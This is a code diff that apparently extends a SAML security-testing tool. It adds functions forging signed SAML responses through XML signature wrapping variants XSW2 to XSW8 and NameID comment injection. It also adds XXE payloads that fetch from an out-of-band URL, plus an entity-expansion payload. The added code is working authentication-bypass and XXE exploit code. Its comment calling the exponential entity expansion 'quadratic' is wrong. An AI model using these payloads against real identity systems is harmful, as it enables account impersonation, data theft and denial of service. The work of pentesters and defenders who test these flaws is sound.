@@ -192,6 +192,304 @@ def xsw1(xml: bytes, evil_subject_name_id: str) -> bytes:
     return _ser(root)
 
 
+# ---------- XSW2 through XSW8 ----------
+
+
+def _clone_and_strip_sig(signed: "etree._Element") -> "etree._Element":
+    """Return a deep clone of `signed` with its own top-level ds:Signature
+    stripped so it can be mutated safely as the 'evil' half."""
+    out = deepcopy(signed)
+    for s in out.xpath("./ds:Signature", namespaces=NSMAP):
+        out.remove(s)
+    return out
+
+
+def _set_nameid(assertion: "etree._Element", text: str) -> None:
+    ni = assertion.find(f".//{{{SAML_NS}}}NameID")
+    if ni is None:
+        return
+    for child in list(ni):
+        ni.remove(child)
+    ni.text = text
+
+
+def _signed_assertion(root: "etree._Element") -> "etree._Element":
+    a = root.find(f"./{{{SAML_NS}}}Assertion")
+    if a is None:
+        raise SAMLForgeError("no saml:Assertion in Response")
+    return a
+
+
+def xsw2(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW2: signed Assertion detached and placed as a sibling under a
+    parasitic Object element next to the evil Assertion. The evil one keeps
+    the original ID; the signed clone keeps its own ID."""
+    root = _parse(xml)
+    if root.tag != f"{{{SAMLP_NS}}}Response":
+        raise SAMLForgeError("XSW2 requires samlp:Response root")
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+
+    # Build a parasitic container element (Object from XML-dsig namespace)
+    # that holds the signed clone. SPs that iterate child::saml:Assertion
+    # pick the evil one; signature verifiers that chase Reference URI find
+    # the signed clone inside Object.
+    obj = etree.Element(f"{{{DS_NS}}}Object")
+    obj.append(deepcopy(signed))
+
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.remove(signed)
+    parent.insert(idx, evil)
+    parent.insert(idx + 1, obj)
+    return _ser(root)
+
+
+def xsw3(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW3: evil Assertion as the first child of Response; signed Assertion
+    preserved in its original position afterwards. SPs that call
+    firstChildElementOfType(Response, Assertion) pick evil; signature walk
+    finds the intact signed element after."""
+    root = _parse(xml)
+    if root.tag != f"{{{SAMLP_NS}}}Response":
+        raise SAMLForgeError("XSW3 requires samlp:Response root")
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+    root.insert(0, evil)
+    return _ser(root)
+
+
+def xsw4(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW4: signed Assertion is wrapped *inside* the evil Assertion. SPs
+    that read the outermost Assertion pick evil; verifiers that dig via
+    Reference URI reach the nested signed original."""
+    root = _parse(xml)
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+    # Place the signed element as a child of the evil element.
+    evil.append(deepcopy(signed))
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.remove(signed)
+    parent.insert(idx, evil)
+    return _ser(root)
+
+
+def xsw5(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW5: ID swap. Signed Assertion gets a fresh ID; evil Assertion
+    takes the signed one's original ID. SPs that match by ID alone trust
+    the evil, but Reference URI verifies against the renamed signed
+    clone."""
+    root = _parse(xml)
+    signed = _signed_assertion(root)
+    original_id = signed.get("ID") or "_a-1"
+    signed.set("ID", original_id + "-renamed")
+    evil = _clone_and_strip_sig(signed)
+    evil.set("ID", original_id)
+    _set_nameid(evil, evil_subject_name_id)
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.insert(idx, evil)  # before the renamed signed clone
+    return _ser(root)
+
+
+def xsw6(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW6: signed Assertion nested inside evil's Signature/Object.
+    Reference URI resolves into an XML-dsig Object that *itself* contains
+    the signed original, so verifiers walk in; business logic sees the
+    outer evil assertion."""
+    root = _parse(xml)
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+
+    # Build ds:Signature > ds:Object > signed-clone
+    sig = etree.SubElement(evil, f"{{{DS_NS}}}Signature")
+    obj = etree.SubElement(sig, f"{{{DS_NS}}}Object")
+    obj.append(deepcopy(signed))
+
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.remove(signed)
+    parent.insert(idx, evil)
+    return _ser(root)
+
+
+def xsw7(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW7: signed Assertion placed inside samlp:Extensions; evil Assertion
+    in Response. Equivalent to XSW1 but with a different structural trick
+    (the XSW1 clone is a duplicate; here the original gets relocated)."""
+    root = _parse(xml)
+    if root.tag != f"{{{SAMLP_NS}}}Response":
+        raise SAMLForgeError("XSW7 requires samlp:Response root")
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+
+    extensions = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
+    extensions.append(deepcopy(signed))
+
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.remove(signed)
+    parent.insert(idx, evil)
+    return _ser(root)
+
+
+def xsw8(xml: bytes, evil_subject_name_id: str) -> bytes:
+    """XSW8: XSW6 variant; signed Assertion inside a ds:Object that is
+    directly a child of Response (not under Signature)."""
+    root = _parse(xml)
+    signed = _signed_assertion(root)
+    evil = _clone_and_strip_sig(signed)
+    _set_nameid(evil, evil_subject_name_id)
+
+    obj = etree.SubElement(root, f"{{{DS_NS}}}Object")
+    obj.append(deepcopy(signed))
+
+    parent = signed.getparent()
+    idx = list(parent).index(signed)
+    parent.remove(signed)
+    parent.insert(idx, evil)
+    return _ser(root)
+
+
+XSW_VARIANTS: dict[str, Any] = {
+    "xsw1": xsw1,
+    "xsw2": xsw2,
+    "xsw3": xsw3,
+    "xsw4": xsw4,
+    "xsw5": xsw5,
+    "xsw6": xsw6,
+    "xsw7": xsw7,
+    "xsw8": xsw8,
+}
+
+
+# ---------- NameID attribute-value comment injection ----------
+
+
+def inject_nameid_attribute_comment(xml: bytes, victim: str) -> bytes:
+    """Some SPs read NameID via an attribute path (SPNameQualifier, etc.)
+    rather than element text. This variant injects a comment into the
+    first text-bearing attribute of the NameID so attribute-normalization
+    behaves differently from business logic reads."""
+    root = _parse(xml)
+    nameid = root.find(f".//{{{SAML_NS}}}NameID")
+    if nameid is None:
+        raise SAMLForgeError("no saml:NameID found")
+    # Set Format so attribute-based parsers have something to latch onto.
+    nameid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
+    nameid.text = victim
+    comment = etree.Comment("")
+    comment.tail = ".attacker.test"
+    nameid.append(comment)
+    return _ser(root)
+
+
+# ---------- XXE payload builders ----------
+#
+# These produce XML bodies that trigger XML-external-entity behavior in
+# vulnerable parsers. The check / CLI hands them to the operator, who sends
+# them to their IdP's SSO endpoint out of band. Keep payloads bounded --
+# we NEVER ship a billion-laughs exponential bomb; a modest quadratic
+# expansion is enough to reveal whether the parser expands entities.
+
+
+_XXE_BASE_AUTHN_REQUEST = """<?xml version="1.0"?>
+<samlp:AuthnRequest
+    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+    ID="_xxe-probe" Version="2.0" IssueInstant="2025-01-01T00:00:00Z"
+    AssertionConsumerServiceURL="{acs_url}"
+    Destination="{destination}">
+  <saml:Issuer>{issuer}</saml:Issuer>
+  <samlp:NameIDPolicy Format="&probe;" AllowCreate="true"/>
+</samlp:AuthnRequest>"""
+
+
+def xxe_external_entity(
+    *,
+    oob_url: str,
+    issuer: str,
+    acs_url: str,
+    destination: str,
+) -> bytes:
+    """AuthnRequest whose DOCTYPE defines an external entity pointing at
+    an operator-controlled OOB URL (e.g. the oauthive malicious RP's /cb).
+    If the IdP fetches that URL, XXE is live.
+
+    The entity is used inside NameIDPolicy/@Format so the attack reveals
+    itself even if the IdP only partially parses the request before
+    rejecting."""
+    doctype = f'<!DOCTYPE samlp:AuthnRequest [<!ENTITY probe SYSTEM "{oob_url}">]>'
+    body = _XXE_BASE_AUTHN_REQUEST.format(
+        issuer=issuer, acs_url=acs_url, destination=destination
+    )
+    # Insert DOCTYPE right after the XML declaration.
+    return body.replace(
+        '<?xml version="1.0"?>',
+        f'<?xml version="1.0"?>\n{doctype}',
+    ).encode()
+
+
+def xxe_parameter_entity(
+    *,
+    oob_url: str,
+    issuer: str,
+    acs_url: str,
+    destination: str,
+) -> bytes:
+    """AuthnRequest that uses a parameter-entity chain to fetch a DTD from
+    an OOB URL and then pull data back. Reveals parsers that resolve
+    external parameter entities even when they refuse external general
+    entities."""
+    doctype = (
+        f'<!DOCTYPE samlp:AuthnRequest [\n'
+        f'  <!ENTITY % remote SYSTEM "{oob_url}">\n'
+        f'  %remote;\n'
+        f']>'
+    )
+    body = _XXE_BASE_AUTHN_REQUEST.format(
+        issuer=issuer, acs_url=acs_url, destination=destination
+    )
+    body = body.replace("&probe;", "placeholder")
+    return body.replace(
+        '<?xml version="1.0"?>',
+        f'<?xml version="1.0"?>\n{doctype}',
+    ).encode()
+
+
+def xxe_bounded_expansion(
+    *, issuer: str, acs_url: str, destination: str, depth: int = 4
+) -> bytes:
+    """Internal-entity quadratic expansion. `depth` is clamped to [2, 5] --
+    higher values can cause genuine DoS against a vulnerable target, which
+    is out of scope for oauthive. Defaults are safe to test production-like
+    dev tenants."""
+    depth = max(2, min(5, depth))
+    entities = []
+    entities.append('<!ENTITY lol0 "lol">')
+    for i in range(1, depth + 1):
+        body = "&lol{};".format(i - 1) * 10  # quadratic (depth*10), bounded
+        entities.append(f'<!ENTITY lol{i} "{body}">')
+    use = f"&lol{depth};"
+    doctype = (
+        "<!DOCTYPE samlp:AuthnRequest [\n" + "\n".join(entities) + "\n]>"
+    )
+    body = _XXE_BASE_AUTHN_REQUEST.format(
+        issuer=issuer, acs_url=acs_url, destination=destination
+    )
+    body = body.replace("&probe;", use)
+    return body.replace(
+        '<?xml version="1.0"?>',
+        f'<?xml version="1.0"?>\n{doctype}',
+    ).encode()
+
+
 # ---------- minimal template for operators with no real Response ----------
 
 
